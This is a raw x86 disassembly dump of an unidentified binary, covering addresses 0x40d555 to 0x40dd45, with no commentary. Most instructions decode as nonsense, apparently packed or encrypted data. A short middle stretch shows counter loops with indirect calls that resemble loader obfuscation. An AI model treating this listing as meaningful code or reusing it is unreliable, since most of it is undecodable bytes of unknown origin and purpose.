  40d555:	mov    edx,0x56072767
  40d55a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d55b:	xor    ecx,DWORD PTR [eax+0x57daf26e]
  40d561:	ror    BYTE PTR [eax+eiz*2+0x6c47674c],0x73
  40d569:	popf   
  40d56a:	test   BYTE PTR [edx-0x2b19cd9e],bh
  40d570:	or     al,0x85
  40d572:	out    0x49,al
  40d574:	sub    eax,0xe290427e
  40d579:	dec    edx
  40d57a:	pop    ds
  40d57b:	pop    edi
  40d57c:	sbb    eax,0xc7a72623
  40d581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d582:	mov    dh,0x71
  40d584:	sahf   
  40d585:	xor    al,0xd0
  40d587:	fcomp  st(4)
  40d589:	pop    ebx
  40d58a:	retf   0x3120
  40d58d:	sub    eax,0x91995028
  40d592:	xchg   DWORD PTR [ebx],ebx
  40d594:	pop    ebx
  40d595:	arpl   WORD PTR [ebx-0x7f],si
  40d598:	imul   ebp,edi,0xa
  40d59b:	mov    dh,0x8f
  40d59d:	shl    DWORD PTR [edi+0x3c49dc2c],1
  40d5a3:	(bad)  
  40d5a4:	mov    edx,0xbaa7e637
  40d5a9:	add    DWORD PTR [ecx+0x76],esi
  40d5ac:	dec    esi
  40d5ad:	pushf  
  40d5ae:	aam    0xe6
  40d5b0:	mov    ds:0x8af50423,eax
  40d5b5:	call   0x455f:0xb2974756
  40d5bc:	push   0x62
  40d5be:	inc    esp
  40d5bf:	leave  
  40d5c0:	test   BYTE PTR [eax],0x37
  40d5c3:	ins    DWORD PTR es:[edi],dx
  40d5c4:	rol    BYTE PTR [edx-0x1fb8f39a],cl
  40d5ca:	(bad)  
  40d5cb:	mov    al,0xe6
  40d5cd:	call   0xffea:0x7ff9d837
  40d5d4:	sub    DWORD PTR [ecx],esp
  40d5d6:	sub    eax,0xdf8bc12f
  40d5db:	sbb    al,0x49
  40d5dd:	adc    BYTE PTR [eax],bl
  40d5df:	mov    ah,0x59
  40d5e1:	es push ebp
  40d5e3:	cmp    ch,al
  40d5e5:	das    
  40d5e6:	imul   edi,eax,0x29d83d8b
  40d5ec:	push   es
  40d5ed:	add    DWORD PTR [edi+0x5f],esp
  40d5f0:	jp     0x40d652
  40d5f2:	aas    
  40d5f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5f4:	(bad)  
  40d5f5:	pop    ebp
  40d5f6:	in     eax,dx
  40d5f7:	mov    edi,0xda562041
  40d5fc:	rcl    DWORD PTR [ebx+0x6b60418],1
  40d602:	fdiv   QWORD PTR [ecx-0x7f6bfa94]
  40d608:	jmp    0x43a3:0x1ff2b418
  40d60f:	dec    ebx
  40d610:	stos   DWORD PTR es:[edi],eax
  40d611:	mov    dh,0xbf
  40d613:	push   cs
  40d614:	cs xchg edx,eax
  40d616:	adc    eax,DWORD PTR [edi+0x42a0fcdb]
  40d61c:	pop    esp
  40d61d:	pop    DWORD PTR [eax-0x69dbe74c]
  40d623:	aas    
  40d624:	inc    esi
  40d625:	jmp    0x7e3a:0x1ca0e3bc
  40d62c:	ret    0x6dc8
  40d62f:	mov    eax,0xe1132ff7
  40d634:	test   BYTE PTR [eax],0x46
  40d637:	les    ebp,FWORD PTR [edx+0x6a]
  40d63a:	loope  0x40d608
  40d63c:	sub    DWORD PTR [ecx+eax*4],esp
  40d63f:	(bad)  
  40d640:	in     al,0x21
  40d642:	cmp    al,0x78
  40d644:	adc    BYTE PTR [edx+0x436d9085],bl
  40d64a:	and    dl,BYTE PTR [edx]
  40d64c:	stos   BYTE PTR es:[edi],al
  40d64d:	mov    al,ds:0xb656bbca
  40d652:	add    DWORD PTR [edi],0xaf18349c
  40d658:	dec    BYTE PTR [ebx+0x51]
  40d65b:	(bad)  
  40d65c:	fwait
  40d65d:	imul   esi,DWORD PTR [edx-0x8],0x73
  40d661:	push   esi
  40d662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d663:	mov    bl,0xde
  40d665:	lods   eax,DWORD PTR ds:[esi]
  40d666:	mov    ah,BYTE PTR [edi-0x19]
  40d669:	inc    esi
  40d66a:	dec    ecx
  40d66b:	arpl   bp,cx
  40d66d:	test   DWORD PTR [ecx],0x3a518ce6
  40d673:	xor    DWORD PTR [ebx],0x99a2225e
  40d679:	in     al,0xe1
  40d67b:	fstp   DWORD PTR [eax+edx*4-0x58614e10]
  40d683:	lock or BYTE PTR [ebp+0x21],ch
  40d687:	test   DWORD PTR [edx-0x385d0799],0xe770b159
  40d691:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40d693:	scas   al,BYTE PTR es:[edi]
  40d694:	shl    ch,1
  40d696:	xchg   edx,eax
  40d697:	lods   eax,DWORD PTR ds:[esi]
  40d698:	jl     0x40d6bc
  40d69a:	fist   WORD PTR [esi+0x347be8d3]
  40d6a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6a1:	sbb    al,0xe6
  40d6a3:	push   ds
  40d6a4:	pop    esp
  40d6a5:	iret   
  40d6a6:	imul   ebp,DWORD PTR [ebp+esi*1-0x5d],0x7778f2e2
  40d6ae:	mov    ah,0x24
  40d6b0:	push   ecx
  40d6b1:	in     al,dx
  40d6b2:	sub    bh,BYTE PTR [ebp+0x5c]
  40d6b5:	stos   BYTE PTR es:[edi],al
  40d6b6:	(bad)  {k7}
  40d6bb:	sub    al,0x64
  40d6bd:	jmp    0x5d0ca427
  40d6c2:	jnp    0x40d6fe
  40d6c4:	pop    esi
  40d6c5:	clc    
  40d6c6:	mov    ds:0x12b98e01,eax
  40d6cb:	cmp    al,0x3e
  40d6cd:	nop
  40d6ce:	out    dx,eax
  40d6cf:	shl    DWORD PTR [edx+0x6686f114],cl
  40d6d5:	or     dl,ch
  40d6d7:	pop    es
  40d6d8:	push   eax
  40d6d9:	pop    eax
  40d6da:	rol    BYTE PTR [ecx+0xe],0x8a
  40d6de:	xchg   dh,ch
  40d6e0:	dec    eax
  40d6e1:	in     al,dx
  40d6e2:	cli    
  40d6e3:	xchg   edx,eax
  40d6e4:	sbb    esp,0xffffff8f
  40d6e7:	sbb    al,0xf4
  40d6e9:	aas    
  40d6ea:	pusha  
  40d6eb:	or     DWORD PTR [edi+0x36],esp
  40d6ee:	jne    0x40d692
  40d6f0:	and    ebp,esp
  40d6f2:	(bad)  
  40d6f3:	retf   0x9a9d
  40d6f6:	or     al,0x51
  40d6f8:	cmc    
  40d6f9:	cdq    
  40d6fa:	mov    ecx,0x4573
  40d6ff:	add    edx,ecx
  40d701:	not    esi
  40d703:	mov    esi,0x7879
  40d708:	or     edi,0x6bdc
  40d70e:	mov    edi,0x1556
  40d713:	sub    DWORD PTR ds:0x43441d,0x432dde
  40d71d:	xchg   esi,ecx
  40d71f:	sub    edx,edi
  40d721:	xor    DWORD PTR ds:0x434411,0x1648
  40d72b:	xor    esi,esi
  40d72d:	and    DWORD PTR ds:0x432dca,0x0
  40d737:	jmp    0x40d749
  40d73c:	mov    ecx,DWORD PTR ds:0x432dca
  40d742:	inc    ecx
  40d743:	mov    DWORD PTR ds:0x432dca,ecx
  40d749:	cmp    DWORD PTR ds:0x432dca,0x11
  40d750:	jae    0x40d7ce
  40d756:	cmp    DWORD PTR ds:0x432dca,0x1e
  40d75d:	jne    0x40d76e
  40d763:	push   0x470a
  40d768:	call   DWORD PTR ds:0x432c72
  40d76e:	jmp    0x40d73c
  40d773:	and    DWORD PTR ds:0x434386,0x0
  40d77d:	mov    ecx,DWORD PTR ds:0x434386
  40d783:	inc    ecx
  40d784:	mov    DWORD PTR ds:0x434386,ecx
  40d78a:	cmp    DWORD PTR ds:0x434386,0xa
  40d791:	jne    0x40d7a7
  40d797:	push   0x4328db
  40d79c:	push   0x43287d
  40d7a1:	call   DWORD PTR ds:0x4329f6
  40d7a7:	cmp    DWORD PTR ds:0x434386,0x9
  40d7ae:	jne    0x40d7c1
  40d7b4:	mov    ecx,DWORD PTR ds:0x434386
  40d7ba:	inc    ecx
  40d7bb:	mov    DWORD PTR ds:0x434386,ecx
  40d7c1:	cmp    DWORD PTR ds:0x434386,0x18
  40d7c8:	jb     0x40d77d
  40d7ce:	mov    DWORD PTR [ebp-0x28],esi
  40d7d1:	mov    DWORD PTR [ebp-0x2c],esi
  40d7d4:	and    DWORD PTR ds:0x434396,0x0
  40d7de:	jmp    0x40d7f0
  40d7e3:	mov    ecx,DWORD PTR ds:0x434396
  40d7e9:	inc    ecx
  40d7ea:	mov    DWORD PTR ds:0x434396,ecx
  40d7f0:	cmp    DWORD PTR ds:0x434396,0x1f
  40d7f7:	jae    0x40d83c
  40d7fd:	cmp    DWORD PTR ds:0x434396,0x11
  40d804:	jne    0x40d813
  40d80a:	push   DWORD PTR [ebp-0x28]
  40d80d:	call   DWORD PTR ds:0x4329fa
  40d813:	cmp    DWORD PTR ds:0x434396,0x10
  40d81a:	jne    0x40d82d
  40d820:	mov    ecx,DWORD PTR ds:0x434396
  40d826:	inc    ecx
  40d827:	mov    DWORD PTR ds:0x434396,ecx
  40d82d:	jmp    0x40d7e3
  40d832:	or     DWORD PTR ds:0x432de2,0x1ed3
  40d83c:	mov    DWORD PTR [ebp-0x14],esi
  40d83f:	adc    DWORD PTR ds:0x432704,0x1c7c
  40d849:	jmp    0x40dc3d
  40d84e:	addr16 int3 
  40d850:	ss data16 mov cl,0x62
  40d854:	ja     0x40d81f
  40d856:	or     bl,BYTE PTR [esi-0x3c]
  40d859:	in     al,0xb9
  40d85b:	je     0x40d8a3
  40d85d:	cmp    eax,0x70708a57
  40d862:	dec    ecx
  40d863:	jge    0x40d8d5
  40d865:	jo     0x40d883
  40d867:	push   ss
  40d868:	jo     0x40d8cb
  40d86a:	hlt    
  40d86b:	jns    0x40d870
  40d86d:	stos   BYTE PTR es:[edi],al
  40d86e:	jo     0x40d7f2
  40d870:	js     0x40d7f7
  40d872:	cmp    al,0x30
  40d874:	mov    cl,dl
  40d876:	pop    ds
  40d877:	popf   
  40d878:	jb     0x40d850
  40d87a:	mov    dl,0x29
  40d87c:	lea    ebx,[eax]
  40d87e:	xchg   edx,eax
  40d87f:	mov    ch,0x98
  40d882:	es in  al,dx
  40d884:	fist   DWORD PTR [eax-0x22abc022]
  40d88a:	mov    ds:0x21e2e03e,al
  40d88f:	out    dx,al
  40d890:	enter  0x910f,0x55
  40d894:	int    0xbc
  40d896:	stos   DWORD PTR es:[edi],eax
  40d897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d898:	imul   eax,DWORD PTR [esp+ebx*2],0x6b26e4a8
  40d89f:	xor    ecx,DWORD PTR [ebx+0x3]
  40d8a2:	retf   
  40d8a3:	les    ebx,FWORD PTR [edi]
  40d8a5:	sub    eax,0x7a282924
  40d8aa:	xor    ebx,DWORD PTR [ecx-0x3e]
  40d8ad:	fnstsw WORD PTR [esi+0x20012746]
  40d8b3:	lahf   
  40d8b4:	pop    edx
  40d8b5:	adc    ecx,edx
  40d8b7:	scas   al,BYTE PTR es:[edi]
  40d8b8:	xor    eax,0xea2afc5d
  40d8bd:	dec    edx
  40d8be:	retf   0x5c04
  40d8c1:	mov    edx,0xdd392430
  40d8c6:	cmp    al,0x4c
  40d8c8:	or     eax,0x8341972
  40d8cd:	sub    BYTE PTR [ebx+0x2de4b4f5],cl
  40d8d3:	cmp    DWORD PTR [edx+ebp*2],esp
  40d8d6:	pop    eax
  40d8d7:	fild   WORD PTR [edx+0x11]
  40d8da:	sub    edx,DWORD PTR [ecx]
  40d8dc:	push   cs
  40d8dd:	pop    ss
  40d8de:	xlat   BYTE PTR ds:[ebx]
  40d8df:	and    dh,dh
  40d8e1:	outs   dx,BYTE PTR ds:[esi]
  40d8e2:	xchg   edx,eax
  40d8e3:	push   ebx
  40d8e4:	cdq    
  40d8e5:	retf   
  40d8e6:	inc    eax
  40d8e7:	cmp    DWORD PTR [ebp-0x664cacee],esi
  40d8ed:	mov    dl,0xf9
  40d8ef:	and    ebx,DWORD PTR [edi-0x155f8f21]
  40d8f5:	add    eax,0x769c5d3b
  40d8fa:	icebp  
  40d8fb:	pusha  
  40d8fc:	ins    DWORD PTR es:[edi],dx
  40d8fd:	push   ss
  40d8fe:	cwde   
  40d8ff:	pop    ecx
  40d900:	pop    ss
  40d901:	ja     0x40d905
  40d903:	in     al,0x6b
  40d905:	push   ecx
  40d906:	xor    dl,BYTE PTR [ebp+0x6cbce195]
  40d90c:	adc    bl,BYTE PTR [edx]
  40d90e:	jne    0x40d932
  40d910:	sub    ebp,DWORD PTR [eax]
  40d912:	dec    eax
  40d913:	(bad)
  40d916:	mov    al,ds:0x327214e0
  40d91b:	clc    
  40d91c:	xchg   edi,eax
  40d91d:	cmp    al,0x7d
  40d91f:	arpl   WORD PTR [ebp-0x41],bp
  40d922:	adc    ebp,DWORD PTR [eax+esi*8+0x337cc38e]
  40d929:	dec    eax
  40d92a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d92b:	mov    ebp,0x9f2d6b77
  40d930:	(bad)  
  40d932:	sti    
  40d933:	jb     0x40d994
  40d935:	ficomp WORD PTR [ebx+0x6e5287ad]
  40d93b:	rol    cl,1
  40d93d:	into   
  40d93e:	inc    eax
  40d93f:	adc    DWORD PTR [edi+0x67],ecx
  40d942:	test   al,0xfd
  40d944:	mov    ds:0xcb2dc360,al
  40d949:	rcr    DWORD PTR [eax],cl
  40d94b:	clc    
  40d94c:	xlat   BYTE PTR ds:[ebx]
  40d94d:	mov    ebx,0xb64754e0
  40d952:	xor    ecx,DWORD PTR [edi]
  40d954:	dec    esp
  40d955:	mov    WORD PTR [esi-0x14],cs
  40d958:	sbb    eax,0xa2dbd1a2
  40d95d:	jmp    0x40d91c
  40d95f:	add    al,0xa5
  40d961:	pop    edi
  40d962:	rol    edx,cl
  40d964:	stos   DWORD PTR es:[edi],eax
  40d965:	dec    edx
  40d966:	(bad)  
  40d967:	add    DWORD PTR [ebx],ecx
  40d969:	idiv   DWORD PTR [ecx+ebp*2-0x41]
  40d96d:	(bad)  
  40d96e:	mov    ch,0x86
  40d970:	sub    al,0xc8
  40d972:	sbb    al,0x44
  40d974:	mov    al,ds:0x35f721ae
  40d979:	push   0xd4cc212a
  40d97e:	add    ebx,DWORD PTR [esi]
  40d980:	shl    DWORD PTR [edi-0x3e04f769],0x3e
  40d987:	cld    
  40d988:	(bad)  
  40d989:	pusha  
  40d98a:	mov    BYTE PTR [esi-0x6ba29496],dl
  40d990:	ror    edx,1
  40d992:	pop    ds
  40d993:	enter  0x5741,0x92
  40d997:	mov    bl,0x91
  40d999:	in     eax,dx
  40d99a:	jl     0x40d9c2
  40d99c:	(bad)  
  40d99d:	sbb    eax,0x510d44c3
  40d9a2:	in     eax,0xfb
  40d9a4:	test   al,0x6f
  40d9a6:	imul   esi,DWORD PTR [edx-0x3a],0xfe8aa05a
  40d9ad:	dec    ebp
  40d9ae:	nop
  40d9af:	call   0x6488:0x190d8486
  40d9b6:	pop    eax
  40d9b7:	(bad)  
  40d9b8:	icebp  
  40d9b9:	push   ecx
  40d9ba:	add    bl,BYTE PTR [ebx+0x458cc3db]
  40d9c0:	inc    eax
  40d9c1:	mov    ds:0xce894f56,eax
  40d9c6:	ins    BYTE PTR es:[edi],dx
  40d9c7:	fstp   QWORD PTR [edx-0x13]
  40d9ca:	xchg   ebp,eax
  40d9cb:	pop    ss
  40d9cc:	mov    edi,0xcd951791
  40d9d1:	outs   dx,DWORD PTR ds:[esi]
  40d9d2:	jle    0x40d96b
  40d9d4:	mov    cl,0xdc
  40d9d6:	int3   
  40d9d7:	mov    eax,0xc43074da
  40d9dc:	int    0xe0
  40d9de:	pop    ebx
  40d9df:	pop    edx
  40d9e0:	inc    edi
  40d9e1:	lock aad 0x2
  40d9e4:	mov    ds:0x13c7dd5f,eax
  40d9e9:	push   cs
  40d9ea:	jge    0x40d999
  40d9ec:	in     eax,dx
  40d9ed:	aaa    
  40d9ee:	packssdw mm5,QWORD PTR ds:0xa47b8f3b
  40d9f5:	adc    ecx,ecx
  40d9f7:	sub    eax,0x5b008f98
  40d9fc:	dec    eax
  40d9fd:	or     ecx,DWORD PTR [esi-0xc]
  40da00:	iret   
  40da01:	mov    WORD PTR [esi],gs
  40da03:	cmp    al,0x33
  40da05:	ds popa 
  40da07:	jp     0x40da7a
  40da09:	pusha  
  40da0a:	sbb    bh,dl
  40da0c:	dec    esi
  40da0d:	xor    al,0x97
  40da0f:	es inc edx
  40da11:	jle    0x40da34
  40da13:	jnp    0x40d9fc
  40da15:	or     eax,0x95c76f7a
  40da1a:	add    edx,eax
  40da1c:	scas   al,BYTE PTR es:[edi]
  40da1d:	sub    BYTE PTR [edi-0x156e7ce6],dl
  40da23:	and    al,BYTE PTR [edi-0x5d360ddf]
  40da29:	dec    ebp
  40da2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da2b:	repnz add edx,DWORD PTR [ebx]
  40da2e:	or     esi,edx
  40da30:	loop   0x40d9f2
  40da32:	ret    
  40da33:	lahf   
  40da34:	mov    ds:0x69ec0f18,eax
  40da39:	dec    ebx
  40da3a:	cwde   
  40da3b:	iret   
  40da3c:	pop    es
  40da3d:	lahf   
  40da3e:	fisub  DWORD PTR ds:0x8cf453da
  40da44:	loopne 0x40daba
  40da46:	enter  0xac61,0x5c
  40da4a:	push   ebp
  40da4b:	in     eax,dx
  40da4c:	aaa    
  40da4d:	aaa    
  40da4e:	cmp    BYTE PTR [ebp-0x20],dh
  40da51:	sbb    ebx,DWORD PTR [edi+ecx*2+0x76]
  40da55:	in     al,0xf6
  40da57:	push   ecx
  40da58:	or     DWORD PTR [ecx-0x5e26d73f],edx
  40da5e:	push   0xffffffee
  40da60:	fsubr  st(0),st
  40da62:	in     eax,dx
  40da63:	es xchg ebp,eax
  40da65:	out    dx,eax
  40da66:	add    al,0xbe
  40da68:	pop    esp
  40da69:	or     al,0xf
  40da6b:	pusha  
  40da6c:	inc    ebx
  40da6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da6e:	fyl2x  
  40da70:	sahf   
  40da71:	mov    eax,0xa185cbff
  40da76:	ins    DWORD PTR es:[edi],dx
  40da77:	fs mov ebp,0x2aef0acf
  40da7d:	or     esp,DWORD PTR [esp+eax*1+0x749d77c5]
  40da84:	adc    BYTE PTR [esi],dl
  40da86:	fsub   QWORD PTR ds:[ebp+edx*4-0x47]
  40da8b:	mov    eax,0xbe4d16d1
  40da90:	(bad)  
  40da91:	mov    ds:0x366769e4,eax
  40da96:	xchg   esp,eax
  40da97:	daa    
  40da98:	sub    DWORD PTR [edi-0x10],0xb3089612
  40da9f:	adc    eax,0xfbf076df
  40daa4:	fwait
  40daa5:	jg     0x40da48
  40daa7:	test   BYTE PTR [edi+esi*1],ah
  40daaa:	iret   
  40daab:	in     eax,dx
  40daac:	mov    bl,0x46
  40daae:	inc    eax
  40daaf:	fnstsw WORD PTR [ebx]
  40dab1:	pop    esi
  40dab2:	adc    ebp,edx
  40dab4:	and    ecx,ecx
  40dab6:	mov    ebx,0xd24ccdd6
  40dabb:	or     DWORD PTR [eax],0x2d0c726c
  40dac1:	pop    ss
  40dac2:	test   BYTE PTR [esi+0x7],bh
  40dac5:	mov    DWORD PTR [eax+ecx*2+0x3a],esi
  40dac9:	enter  0x2123,0xdb
  40dacd:	pop    ds
  40dace:	mov    WORD PTR [eax+eax*4+0x6],cs
  40dad2:	inc    esi
  40dad3:	or     BYTE PTR [eax],ch
  40dad5:	sahf   
  40dad6:	mov    eax,ds:0x9a3b6ecd
  40dadb:	push   ss
  40dadc:	fs mov edi,0x789c2a74
  40dae2:	mov    esi,DWORD PTR [ebx+0x299c5455]
  40dae8:	sbb    eax,0xc4d6d086
  40daed:	jno    0x40db11
  40daef:	dec    edx
  40daf0:	sbb    eax,DWORD PTR [esi+eax*1-0x73]
  40daf4:	push   ss
  40daf5:	nop    ebp
  40daf8:	pop    ecx
  40daf9:	mov    BYTE PTR [edi],bl
  40dafb:	jb     0x40da8d
  40dafd:	fwait
  40dafe:	cmp    DWORD PTR [ecx+0x4b89ddc1],esi
  40db04:	ja     0x40db6d
  40db06:	retf   0x41d3
  40db09:	js     0x40db43
  40db0b:	(bad)  
  40db0d:	inc    ecx
  40db0e:	adc    bl,BYTE PTR [ebp-0x79]
  40db11:	das    
  40db12:	arpl   WORD PTR gs:[ecx],si
  40db15:	std    
  40db16:	jecxz  0x40dac8
  40db18:	xor    bl,bl
  40db1a:	or     esp,DWORD PTR [ecx]
  40db1c:	pusha  
  40db1d:	gs je  0x40daf5
  40db20:	xchg   ecx,eax
  40db21:	adc    ax,0xd71b
  40db25:	dec    ebx
  40db26:	xchg   BYTE PTR [eax+0x435f5309],dl
  40db2c:	es cmp eax,0x28ff542d
  40db32:	sub    dh,cl
  40db34:	stos   DWORD PTR es:[edi],eax
  40db35:	cli    
  40db36:	jns    0x40db30
  40db38:	repz cdq 
  40db3a:	lods   eax,DWORD PTR ds:[esi]
  40db3b:	sbb    eax,esi
  40db3d:	lea    esp,[eax-0x22]
  40db40:	aad    0xd5
  40db42:	aas    
  40db43:	sbb    eax,0x829ab975
  40db48:	pop    esi
  40db49:	clc    
  40db4a:	dec    edi
  40db4b:	in     al,dx
  40db4c:	xor    DWORD PTR [esi+0x7a9f156],0x5a
  40db53:	cmp    BYTE PTR [edx-0x3cf87c87],ch
  40db59:	xor    al,0xd0
  40db5b:	mov    cl,BYTE PTR [edx-0x358b186b]
  40db61:	sub    BYTE PTR ds:0x94526173,cl
  40db67:	or     ch,dh
  40db69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db6a:	loop   0x40db4c
  40db6c:	jmp    0x40dbdf
  40db6e:	adc    cl,dl
  40db70:	fidiv  WORD PTR [ebx]
  40db72:	shr    ebx,0xd
  40db75:	sbb    DWORD PTR [edx],edi
  40db77:	adc    ah,dh
  40db79:	dec    eax
  40db7a:	xor    esi,edx
  40db7c:	(bad)
  40db80:	scas   al,BYTE PTR es:[edi]
  40db81:	sub    DWORD PTR [ecx],edi
  40db83:	push   esi
  40db84:	clc    
  40db85:	push   edi
  40db86:	mov    dl,0x1e
  40db88:	adc    DWORD PTR [edx-0x34],ecx
  40db8b:	icebp  
  40db8c:	fwait
  40db8d:	and    eax,0x43360f60
  40db92:	or     eax,0x31870a3
  40db97:	xor    ebx,esi
  40db99:	mov    cl,0xd5
  40db9b:	xor    ecx,ebx
  40db9d:	(bad)  
  40db9e:	retf   0xa02b
  40dba1:	lods   eax,DWORD PTR ds:[esi]
  40dba2:	(bad)  
  40dba5:	add    edi,edx
  40dba7:	retf   0xa3eb
  40dbaa:	lds    ecx,FWORD PTR [esi+0x491731d1]
  40dbb0:	sub    BYTE PTR [edi+0x5c],cl
  40dbb3:	sub    DWORD PTR [ecx+0x4d464c4c],0xffffff97
  40dbba:	stc    
  40dbbb:	ss or  al,0x74
  40dbbe:	jge    0x40dbb8
  40dbc0:	icebp  
  40dbc1:	pop    ecx
  40dbc2:	stc    
  40dbc3:	outs   dx,DWORD PTR ds:[esi]
  40dbc4:	xchg   ebx,eax
  40dbc5:	push   edi
  40dbc6:	xlat   BYTE PTR ds:[ebx]
  40dbc7:	add    ch,bh
  40dbc9:	sahf   
  40dbca:	cli    
  40dbcb:	and    eax,0x7fd5d4a8
  40dbd0:	test   al,0x12
  40dbd2:	mov    ds,WORD PTR [esi+0x60]
  40dbd5:	pop    esi
  40dbd6:	ins    BYTE PTR es:[edi],dx
  40dbd7:	sbb    DWORD PTR [ecx+0x6e],eax
  40dbda:	mov    ds:0x1072164d,eax
  40dbdf:	pusha  
  40dbe0:	rcl    esp,0x7e
  40dbe3:	rcl    BYTE PTR [eax+edi*4-0x7c],cl
  40dbe7:	jmp    0x190b03ff
  40dbec:	(bad)  
  40dbed:	xlat   BYTE PTR ds:[ebx]
  40dbee:	bound  edx,QWORD PTR [ebx]
  40dbf0:	xchg   ebp,eax
  40dbf1:	jno    0x40dbbe
  40dbf3:	sbb    ah,dl
  40dbf5:	pop    esi
  40dbf6:	xor    BYTE PTR [ecx],bh
  40dbf8:	mov    al,0x30
  40dbfa:	neg    BYTE PTR [edi]
  40dbfc:	pop    eax
  40dbfd:	push   es
  40dbfe:	cdq    
  40dbff:	bts    DWORD PTR [ecx],edi
  40dc02:	cwde   
  40dc03:	dec    esi
  40dc04:	adc    si,WORD PTR [esi-0x3d]
  40dc08:	rep outs dx,BYTE PTR ds:[esi]
  40dc0a:	jmp    0x40dc29
  40dc0c:	popa   
  40dc0d:	scas   eax,DWORD PTR es:[edi]
  40dc0e:	icebp  
  40dc0f:	and    al,0x38
  40dc11:	or     BYTE PTR [esi-0xf],ch
  40dc14:	adc    bl,BYTE PTR [eax-0x3db7a98f]
  40dc1a:	mov    ch,0x31
  40dc1c:	popf   
  40dc1d:	sub    DWORD PTR [esi+0x7b1b9c75],edx
  40dc23:	cmp    BYTE PTR [ebx-0x6d1d2c3f],0x7
  40dc2a:	jmp    0xf177ff3c
  40dc2f:	push   ss
  40dc30:	rcl    ah,1
  40dc32:	(bad)  
  40dc34:	iret   
  40dc35:	push   esi
  40dc36:	lock fwait
  40dc38:	jns    0x40dc94
  40dc3a:	sbb    ah,BYTE PTR [eax]
  40dc3c:	fisttp QWORD PTR [ecx+0xd8bf875]
  40dc42:	call   0xc60d:0x21004343
  40dc49:	sub    eax,0x4d8b0043
  40dc4e:	call   0x273901d4
  40dc53:	inc    ebx
  40dc54:	add    BYTE PTR [ecx],dl
  40dc56:	inc    esp
  40dc57:	inc    ebx
  40dc58:	add    BYTE PTR [ebx],dh
  40dc5a:	enter  0xefe9,0x3
  40dc5e:	add    BYTE PTR [eax],al
  40dc60:	mov    bl,0x93
  40dc62:	iret   
  40dc63:	(bad)
  40dc66:	mov    cl,0x71
  40dc68:	out    0x43,eax
  40dc6a:	fs jb  0x40dc94
  40dc6d:	scas   al,BYTE PTR es:[di]
  40dc6f:	mov    dh,0xa0
  40dc71:	xchg   esi,eax
  40dc72:	jo     0x40dce4
  40dc74:	dec    ecx
  40dc75:	jge    0x40dce7
  40dc77:	jo     0x40dcea
  40dc79:	inc    eax
  40dc7a:	or     esp,DWORD PTR [ecx-0x7]
  40dc7d:	push   0xa36936c2
  40dc82:	mov    ecx,0xf23436bc
  40dc87:	pushf  
  40dc88:	inc    ecx
  40dc89:	mov    bh,BYTE PTR [ebx+ebp*4]
  40dc8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc8d:	scas   al,BYTE PTR es:[edi]
  40dc8e:	xlat   BYTE PTR ds:[ebx]
  40dc8f:	pop    DWORD PTR [esi]
  40dc91:	aad    0x3d
  40dc93:	dec    edx
  40dc94:	enter  0x1ac7,0xca
  40dc98:	mov    db6,ecx
  40dc9b:	xchg   edi,eax
  40dc9c:	fiadd  DWORD PTR [esi]
  40dc9e:	das    
  40dc9f:	dec    esp
  40dca0:	(bad)  
  40dca1:	mov    edx,0x32f6e304
  40dca6:	inc    ebp
  40dca7:	adc    edi,DWORD PTR [edx+0x2275694f]
  40dcad:	mov    esi,0x6a7d700c
  40dcb2:	dec    ebx
  40dcb3:	mov    BYTE PTR [eax-0x6701626f],0xd0
  40dcba:	dec    ebp
  40dcbb:	iret   
  40dcbc:	ret    0x42e8
  40dcbf:	dec    edx
  40dcc0:	jo     0x40dcee
  40dcc2:	scas   al,BYTE PTR es:[edi]
  40dcc3:	and    dl,BYTE PTR [ecx-0x559b20c0]
  40dcc9:	aad    0xff
  40dccb:	mov    eax,ds:0x5da242e6
  40dcd0:	lock cdq 
  40dcd2:	mov    edi,0x6e30369e
  40dcd7:	(bad)  
  40dcd8:	fcmovu st,st(0)
  40dcda:	lods   al,BYTE PTR ds:[esi]
  40dcdb:	mov    esi,DWORD PTR [ebx]
  40dcdd:	imul   edx,edx,0x4d922098
  40dce3:	cmp    al,0x16
  40dce5:	push   eax
  40dce6:	out    dx,al
  40dce7:	scas   eax,DWORD PTR es:[edi]
  40dce8:	mov    eax,0x8946859d
  40dced:	ins    BYTE PTR es:[edi],dx
  40dcee:	xor    eax,0x70c35ec3
  40dcf3:	mov    bh,0x2d
  40dcf5:	nop
  40dcf6:	push   0x1ff1acf1
  40dcfb:	aaa    
  40dcfc:	or     al,0x94
  40dcfe:	in     eax,0xaa
  40dd00:	xchg   DWORD PTR [edx],edi
  40dd02:	jmp    0x4f4f:0x6b43d37e
  40dd09:	fwait
  40dd0a:	(bad)  
  40dd0b:	fstp   DWORD PTR [edi-0x71]
  40dd0e:	stos   DWORD PTR es:[edi],eax
  40dd0f:	out    dx,al
  40dd10:	enter  0xa9c0,0x87
  40dd14:	stos   BYTE PTR es:[edi],al
  40dd15:	mov    cl,0x2c
  40dd17:	js     0x40dd82
  40dd19:	sbb    dl,BYTE PTR [edi+esi*8-0x20]
  40dd1d:	jns    0x40dd4f
  40dd1f:	test   eax,esi
  40dd21:	repnz adc al,0x21
  40dd24:	outs   dx,BYTE PTR ds:[esi]
  40dd25:	leave  
  40dd26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd27:	xor    edx,DWORD PTR [ebx]
  40dd29:	mov    ecx,0x9b107f51
  40dd2e:	xchg   ebp,eax
  40dd2f:	adc    al,0x99
  40dd31:	or     al,0xb7
  40dd33:	rcr    eax,1
  40dd35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd36:	lods   eax,DWORD PTR ds:[esi]
  40dd37:	and    ebp,esp
  40dd39:	push   eax
  40dd3a:	aam    0x2b
  40dd3c:	dec    ebx
  40dd3d:	es push ss
  40dd3f:	fcomp  QWORD PTR [ebp+0x131c4c20]
  40dd45:	xlat   BYTE PTR ds:[ebx]
